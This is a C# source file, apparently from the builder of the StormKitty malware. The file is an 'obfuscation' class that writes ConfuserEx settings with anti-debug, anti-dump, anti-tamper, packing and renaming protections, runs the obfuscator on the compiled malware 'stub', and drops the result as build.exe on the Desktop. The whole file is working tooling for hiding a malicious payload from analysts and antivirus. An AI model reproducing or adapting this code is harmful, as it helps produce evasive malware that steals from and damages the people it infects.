/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/StormKitty
*/

using System;
using System.IO;
using System.Reflection;
using System.Diagnostics;

namespace StormKittyBuilder
{
    internal sealed class obfuscation
    {
        // Current directory
        private static string Desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        private static string WorkingDir = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);

        // Write confuzer settings
        private static string WriteSettings(string file)
        {
            string settings = Path.GetTempFileName() + ".crproj";
            string contents = $"<project outputDir=\"{WorkingDir}\\build\" baseDir=\"{WorkingDir}\" xmlns=\"http://confuser.codeplex.com\"><packer id=\"compressor\"/><module path=\"{file}\"><rule pattern=\"true\" preset=\"maximum\" inherit=\"false\"><protection id=\"anti ildasm\"/><protection id=\"constants\"/><protection id=\"anti tamper\"/><protection id=\"ctrl flow\"/><protection id=\"anti dump\"/><protection id=\"anti debug\"/><protection id=\"invalid metadata\"/><protection id=\"ref proxy\"/><protection id=\"resources\"/><protection id=\"rename\"/></rule></module></project>";
            File.WriteAllText(settings, contents);
            return settings;
        }

        // Run confuzer
        private static string Confuzer(string settings)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/C title Confuzer && color f && obfuscator\\Confuser.CLI.exe -n " + settings + " && timeout /t 7",
            };
            Console.ForegroundColor = ConsoleColor.Cyan;
            cli.ShowInfo("Starting obfuscation...");
            Process process = Process.Start(startInfo);
            process.WaitForExit();
            File.Delete("stub\\build.exe");
            File.Move("build\\stub\\build.exe", Desktop + "\\build.exe");
            Directory.Delete("build", true);

            string result = Desktop + "\\build.exe";
            if (File.Exists(result)) return result;
            cli.ShowError("Failed to obfuscate stub");
            return null;
        }

        // Obfuscate executable
        public static string Obfuscate(string file)
        {
            if (!Directory.Exists("obfuscator"))
                cli.ShowError("ConfuzeEx directory not found!");

            string settings = WriteSettings(file);
            string location = Confuzer(settings);
            return location;
        }

    }
}
